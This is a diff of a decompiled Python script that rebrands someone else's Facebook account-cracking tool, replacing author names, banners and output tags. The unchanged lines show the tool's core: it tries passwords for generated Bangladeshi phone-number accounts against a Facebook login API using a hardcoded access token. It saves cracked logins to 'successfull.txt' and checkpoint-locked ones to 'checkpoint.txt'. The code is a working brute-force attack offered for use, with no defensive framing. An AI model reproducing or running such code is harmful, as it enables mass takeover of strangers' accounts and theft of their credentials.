@@ -1,5 +1,5 @@
-# DECRYPTED BY PSYCHO PICCHI
-# Github : https://github.com/PSYCHO PICCHI
+# DECRYPTED BY Delete-XD
+# Github : https://github.com/Delete-XD
  #!/usr/bin/python
 # -*- coding: utf-8
  # uncompyle6 version 3.7.4
@@ -24,10 +24,12 @@ print
 print("""
 
 
-\033[0;93m ____  _  _    ____  _____  __  __ 
-\033[0;93m(  _ \( \/ )  (_  _)(  _  )(  \/  )
-\033[0;96m )   / )  (     )(   )(_)(  )    ( 
-\033[0;96m(_)\_)(_/\_)   (__) (_____)(_/\/\_)
+
+\033[0;93m ____  ____  __    ____  ____  ____     _  _  ____  
+\033[0;93m(  _ \( ___)(  )  ( ___)(_  _)( ___)___( \/ )(  _ \ 
+\033[0;96m )(_) ))__)  )(__  )__)   )(   )__)(___))  (  )(_) )
+\033[0;96m(____/(____)(____)(____) (__) (____)   (_/\_)(____/ 
+
 
 """)
 
@@ -85,10 +87,11 @@ def cb():
  
 logo = """
                                                                       
-\033[0;93m ____  _  _    ____  _____  __  __ 
-\033[0;93m(  _ \( \/ )  (_  _)(  _  )(  \/  )
-\033[0;96m )   / )  (     )(   )(_)(  )    ( 
-\033[0;96m(_)\_)(_/\_)   (__) (_____)(_/\/\_)
+
+\033[0;93m ____  ____  __    ____  ____  ____     _  _  ____  
+\033[0;93m(  _ \( ___)(  )  ( ___)(_  _)( ___)___( \/ )(  _ \ 
+\033[0;96m )(_) ))__)  )(__  )__)   )(   )__)(___))  (  )(_) )
+\033[0;96m(____/(____)(____)(____) (__) (____)   (_/\_)(____/ 
  
 """
 
@@ -102,9 +105,9 @@ def menu():
     os.system('clear')
     print logo
     print ''
-    print '\033[0;93mAUTHOR   : PICCHI TOM'
-    print '\033[0;94mFACEBOOK : PICCHI TOM'
-    print '\033[0;96mGITHUB   : PICCHI TOM'
+    print '\033[0;93mAUTHOR   : Delete-XD'
+    print '\033[0;94mFACEBOOK : Adriyan'
+    print '\033[0;96mGITHUB   : Delete-XD'
     print ''
     print '\033[0;90mONLY BANGLADESHI ACCOUNTS ARE AVAILABLE'
     print '\033[0;91m'
@@ -254,13 +257,13 @@ def action():
             data = br.open('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=1&email=' + k + c + user + '&locale=en_US&password=' + pass1 + '&sdk=ios&generate_session_cookies=1&sig=3f555f98fb61fcd7aa0c44f58f522efm')
             q = json.load(data)
             if 'access_token' in q:
-                print '\x1b[1;92m[TOM-HACKED]\x1b[0m ' + k + c + user + ' | ' + pass1 + '\n' + '\n'
+                print '\x1b[1;92m[XD-HACKED]\x1b[0m ' + k + c + user + ' | ' + pass1 + '\n' + '\n'
                 okb = open('save/successfull.txt', 'a')
                 okb.write(k + c + user + '|' + pass1 + '\n')
                 okb.close()
                 oks.append(c + user + pass1)
             elif 'www.facebook.com' in q['error_msg']:
-                print '\x1b[1;91m[TOM-CP]\x1b[0m ' + k + c + user + ' | ' + pass1 + '\x1b[1;92m \x1b[0m \n'
+                print '\x1b[1;91m[Delete-CP]\x1b[0m ' + k + c + user + ' | ' + pass1 + '\x1b[1;93m[Open After 10 Days]\n'
                 cps = open('save/checkpoint.txt', 'a')
                 cps.write(k + c + user + '|' + pass1 + '\n')
                 cps.close()
